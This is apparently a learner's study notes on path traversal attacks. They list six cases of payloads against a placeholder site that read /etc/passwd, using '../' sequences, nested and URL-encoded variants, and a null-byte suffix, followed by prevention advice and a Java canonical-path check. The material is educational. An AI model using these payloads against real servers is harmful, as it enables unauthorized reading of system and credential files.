
This part isn't too much learning stuffs, cases; so I'll gather all notes into this only file.

- **Case 1**
https://insecure-website.com/ ==loadImage?filename=../../../etc/passwd==

- **Case 2** Using absolute path
https://insecure-website.com/ ==loadImage?filename=/etc/passwd==

- **Case 3** Deal with` $filename = str_replace('../', '', $filename);`

 use nested traversal sequences, ==such as:  ....// or ....\\/==  

- **Case 4** Using URL encoding
useful tool: [CyberChef](https://gchq.github.io/CyberChef/)
e.g:
==Double encoding:==
`GET /image?filename=%252E%252E%252F%252E%252E%252F%252E%252E%252F/etc/passwd HTTP/2`
==Single encoding:==
`GET /image?filename=%2E%2E%2F%2E%2E%2F%2E%2E%2F/etc/passwd HTTP/2`

- **Case 5** (similar to 1) Requiring the user-supplied filename to start with the expected base folder
https://insecure-website.com/ ==loadImage?filename=/var/www/images/../../../etc/passwd==

- **Case 6** Expected file extension
Using NULL bute
https://insecure-website.com/ ==loadImage?filename=../../../etc/passwd%00.png.==

## Preventing Path Traversal Attacks

1. **Avoid User Input in Filesystem APIs** *(Best Practice)*
   * Rewrite functionality to eliminate passing raw user input to file operations.

2. **Two-Layer Defense** *(When input is required)*
   * **Input Validation:** Use strict whitelisting or enforce alphanumeric-only input.
   * **Path Canonicalization:** Resolve the full canonical path and verify it starts with the intended base directory.

```java
File file = new File(BASE_DIRECTORY, userInput);
if (file.getCanonicalPath().startsWith(BASE_DIRECTORY)) {
    // Process file safely
}
```
